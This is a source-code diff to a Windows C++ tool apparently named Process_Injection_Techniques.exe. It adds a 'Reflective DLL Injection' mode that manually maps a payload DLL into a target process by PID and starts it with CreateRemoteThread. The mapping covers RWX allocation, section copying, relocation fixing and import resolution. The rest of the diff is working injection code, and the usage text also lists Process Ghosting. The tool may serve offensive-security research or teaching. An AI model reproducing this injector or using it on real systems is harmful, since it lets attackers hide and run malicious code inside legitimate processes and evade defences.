@@ -16,6 +16,10 @@ struct MODULE_INFO
     BYTE* MainModuleAddress;
 };
 
+#define DEREF_32( name )*(DWORD *)(name)
+#define DEREF_16( name )*(WORD *)(name)
+
+
 DWORD TypeofInjection;
 DWORD ProcessID;
 WCHAR DLLPath[MAX_PATH];
@@ -47,7 +51,7 @@ HANDLE GetSectionHandleFromFileThenDeleteFileOnClose(WCHAR* filePath, BYTE* payl
 BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath);
 LPVOID WriteParameterinProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERSMy params, DWORD protect);
 BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi);
-
+DWORD  LoadRemoteLibraryR(HANDLE hProcess, BYTE* SourceFileData, LPVOID lpParameter);
 
 
 void PrintUsage() {
@@ -95,6 +99,10 @@ void PrintUsage() {
 
     printf("inject process inside other process using Process Ghosting\n");
     printf("Process_Injection_Techniques.exe 12 -n <Target Executable> -d <your payload path>\n\n");
+
+    printf("inject process inside other process using Reflective DLL Injection\n");
+    printf("Note:The Dll Should Depend only on kernel32.dll and ntdll.dll for stability, as they are loaded at the same base address for all processes on the system, See Refrence[6] in the README for more info\n");
+    printf("Process_Injection_Techniques.exe 13 -p <PID> -d <your payload path>\n\n");
 
 
 }
@@ -196,6 +204,13 @@ void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
         wcscpy(ProcessName, argv[index]);
         index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
         wcscpy(SourceProcessName, argv[index]);
+        break;
+
+    case 13:
+        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
+        ProcessID = _wtoi(argv[index]);
+        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
+        wcscpy(DLLPath, argv[index]);
         break;
 
     default:
@@ -624,7 +639,6 @@ HANDLE GetSectionHandleFromFileThenDeleteFileOnClose(WCHAR* filePath, BYTE* payl
     return hSection;
 }
 
-
 WCHAR* GetFileNameFromPath(WCHAR* FullPath)
 {
     size_t len = wcslen(FullPath);
@@ -776,4 +790,187 @@ BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMA
     }
 
     return true;
+}
+
+DWORD  LoadRemoteLibraryR(HANDLE hProcess, BYTE* SourceFileData, LPVOID lpParameter)
+{
+    BOOL bSuccess = FALSE;
+    LPVOID lpRemoteLibraryBuffer = NULL;
+    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+    HANDLE hThread = NULL;
+    DWORD dwReflectiveLoaderOffset = 0;
+    DWORD dwThreadId = 0;
+    DWORD dwLength;
+
+    if (!hProcess || !SourceFileData) {
+
+        printf("invaild argument to LoadRemoteLibraryR\n");
+        return -1;
+    }
+
+
+    PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)SourceFileData);
+    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD64)SourceFileData);
+
+    dwLength = pSourceHeaders->OptionalHeader.SizeOfImage;
+    lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!lpRemoteLibraryBuffer) {
+
+        printf("Failed To allocate Memory in remote Process Error Code is %x\n",GetLastError());
+        return -1;
+    }
+
+
+    DWORD64 dwDelta = (DWORD64)lpRemoteLibraryBuffer - pSourceHeaders->OptionalHeader.ImageBase;
+
+    pSourceHeaders->OptionalHeader.ImageBase = (DWORD64)lpRemoteLibraryBuffer;
+
+    if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, SourceFileData, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0)) {
+       
+        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
+        return -1;
+    }
+
+    for (DWORD64 x = 0; x < pSourceImage->NumberOfSections; x++)
+    {
+        if (!pSourceImage->Sections[x].PointerToRawData)
+            continue;
+
+        PVOID pSectionDestination = (PVOID)((DWORD64)lpRemoteLibraryBuffer + pSourceImage->Sections[x].VirtualAddress);
+
+        if (!WriteProcessMemory(hProcess, pSectionDestination, &SourceFileData[pSourceImage->Sections[x].PointerToRawData], pSourceImage->Sections[x].SizeOfRawData, 0)) {
+            printf("Failed writing process memory at address %p Error Code 0x%x\r\n", pSectionDestination, GetLastError());
+            return -1;
+        }
+    }
+
+    //Fixing the relocation in PE File
+    if (dwDelta)
+        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
+        {
+            char pSectionName[] = ".reloc";
+
+            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
+                continue;
+
+            DWORD64 dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
+            DWORD dwOffset = 0;
+
+            IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+            while (dwOffset < relocData.Size)
+            {
+                PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&SourceFileData[dwRelocAddr + dwOffset];
+
+                dwOffset += sizeof(BASE_RELOCATION_BLOCK);
+
+                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
+
+                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&SourceFileData[dwRelocAddr + dwOffset];
+
+                for (DWORD y = 0; y < dwEntryCount; y++)
+                {
+                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);
+
+                    if (pBlocks[y].Type == 0)
+                        continue;
+
+                    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
+
+                    DWORD64 dwBuffer = 0;
+                    BOOL bSuccess;
+                    bSuccess = ReadProcessMemory(hProcess, (PVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress),&dwBuffer, sizeof(DWORD64), 0);
+                    if (!bSuccess) {
+                        printf("Failed reading memory at address %p  Erro code  0x%x\r\n", (PVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress), GetLastError());
+                        return -1;
+                    }
+
+                    dwBuffer += dwDelta;
+                    bSuccess = WriteProcessMemory(hProcess, (LPVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress), &dwBuffer, sizeof(DWORD64), 0);
+
+                    if (!bSuccess) {
+                        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", (LPVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress, GetLastError()));
+                        return -1;
+                    }
+                }
+            }
+
+            break;
+        }
+
+
+
+    //Resolve IAT API in remote Process
+    //the Pe File Should depend only on kernel32 and ntdll.dll
+    BYTE* RemoteDataBuffer = NULL;
+    RemoteDataBuffer = new BYTE[dwLength];
+    if (!RemoteDataBuffer) {
+        printf("failed to allocate memory\n");
+        return -1;
+    }
+    BOOL ret = ReadProcessMemory(hProcess, (PVOID)lpRemoteLibraryBuffer, RemoteDataBuffer, dwLength, 0);
+    if (!ret) {
+        printf("Failed reading memory at address %p  Erro code  0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
+        return -1;
+    }
+
+    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
+    IMAGE_DATA_DIRECTORY importsDirectory = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)RemoteDataBuffer);
+
+    LPCSTR libraryName = "";
+    HMODULE library = NULL;
+
+
+    while (importDescriptor->Name != NULL)
+    {
+
+        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)RemoteDataBuffer;
+        library = LoadLibraryA(libraryName);
+
+        if (library)
+        {
+
+            PIMAGE_THUNK_DATA thunk = NULL;
+            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)RemoteDataBuffer + importDescriptor->FirstThunk);
+
+            while (thunk->u1.AddressOfData != NULL)
+            {
+
+                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
+                {
+                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
+                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
+                }
+                else
+                {
+                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)RemoteDataBuffer + thunk->u1.AddressOfData);
+                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name); 
+                    thunk->u1.Function = functionAddress;
+                }
+                ++thunk;
+            }
+        }
+
+        importDescriptor++;
+    }
+
+
+    if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, RemoteDataBuffer, dwLength, 0))
+    {
+        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
+        return -1;
+    }
+
+    DWORD64 dwEntrypoint = (DWORD64)lpRemoteLibraryBuffer + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
+
+    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)dwEntrypoint, lpParameter, (DWORD)NULL, &dwThreadId);
+    if (!hThread) {
+        printf("failed to create remote thread Erro Code %x\n",GetLastError());
+        return -1;
+    }
+
+    CloseHandle(hThread);
+    
+    return NULL;
 }
